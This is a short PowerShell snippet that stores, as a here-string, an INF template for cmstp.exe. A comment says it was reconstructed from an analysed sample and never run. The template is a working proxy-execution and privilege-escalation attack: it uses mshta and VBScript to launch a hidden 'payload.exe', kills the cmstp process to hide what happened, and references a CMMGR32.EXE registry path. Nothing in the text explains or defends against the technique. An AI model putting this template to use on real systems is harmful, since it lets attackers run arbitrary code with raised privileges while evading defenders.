# Reconstructed from the managed sample's INF template; never executed.
$inf = @'
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c start """" ""payload.exe"""",0:close")
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""taskkill /IM cmstp.exe /F"",0,true:close")
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
'@
